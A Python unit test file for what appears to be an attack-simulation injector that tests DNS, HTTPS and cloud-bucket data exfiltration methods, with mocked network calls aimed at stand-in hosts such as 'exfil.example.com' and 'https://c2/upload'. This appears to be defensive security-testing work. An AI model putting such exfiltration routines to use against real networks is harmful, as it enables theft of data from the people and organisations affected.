from unittest import TestCase
from unittest.mock import MagicMock, patch

from exfiltration_injector.contracts_exfiltration import (
    CLOUD_EXFIL_CONTRACT,
    DNS_EXFIL_CONTRACT,
    HTTPS_EXFIL_CONTRACT,
    ExfiltrationContracts,
)
from exfiltration_injector.helpers.exfiltration_executor import (
    _MAX_DNS_KB,
    ExfiltrationExecutor,
)


class ContractsTest(TestCase):
    def test_build_contract(self):
        contracts = ExfiltrationContracts.build_contract()
        ids = {c["contract_id"] for c in contracts}
        self.assertEqual(
            ids, {DNS_EXFIL_CONTRACT, HTTPS_EXFIL_CONTRACT, CLOUD_EXFIL_CONTRACT}
        )


class ExecutorTest(TestCase):
    @patch("exfiltration_injector.helpers.exfiltration_executor.socket.getaddrinfo")
    def test_dns_issues_queries(self, mock_getaddrinfo):
        mock_getaddrinfo.side_effect = OSError("nxdomain")
        result = ExfiltrationExecutor().exfiltrate_dns("exfil.example.com", 1)
        self.assertTrue(result.success)
        self.assertTrue(mock_getaddrinfo.called)
        self.assertNotEqual(result.outputs["dns_queries"], ["0"])

    @patch("exfiltration_injector.helpers.exfiltration_executor.socket.getaddrinfo")
    def test_dns_caps_payload_size(self, mock_getaddrinfo):
        mock_getaddrinfo.side_effect = OSError("nxdomain")
        capped = ExfiltrationExecutor().exfiltrate_dns("exfil.example.com", 1024)
        at_cap = ExfiltrationExecutor().exfiltrate_dns("exfil.example.com", _MAX_DNS_KB)
        self.assertEqual(capped.outputs["dns_queries"], at_cap.outputs["dns_queries"])

    @patch("exfiltration_injector.helpers.exfiltration_executor.requests.post")
    def test_https_reports_status(self, mock_post):
        response = MagicMock()
        response.status_code = 200
        mock_post.return_value = response
        result = ExfiltrationExecutor().exfiltrate_https("https://c2/upload", 1)
        self.assertTrue(result.success)
        self.assertIn("200", result.message)

    @patch("exfiltration_injector.helpers.exfiltration_executor.requests.post")
    def test_https_block_is_still_completed(self, mock_post):
        import requests

        mock_post.side_effect = requests.ConnectionError("blocked")
        result = ExfiltrationExecutor().exfiltrate_https("https://c2/upload", 1)
        self.assertTrue(result.success)
        self.assertIn("blocked", result.message)

    @patch("exfiltration_injector.helpers.exfiltration_executor.requests.put")
    def test_cloud_upload(self, mock_put):
        response = MagicMock()
        response.status_code = 200
        mock_put.return_value = response
        result = ExfiltrationExecutor().exfiltrate_cloud("https://bucket/key", 1)
        self.assertTrue(result.success)
        self.assertEqual(result.outputs["url"], ["https://bucket/key"])

    @patch("exfiltration_injector.helpers.exfiltration_executor.requests.put")
    def test_cloud_block_reports_url(self, mock_put):
        import requests

        mock_put.side_effect = requests.ConnectionError("blocked")
        result = ExfiltrationExecutor().exfiltrate_cloud("https://bucket/key", 1)
        self.assertTrue(result.success)
        self.assertEqual(result.outputs["url"], ["https://bucket/key"])
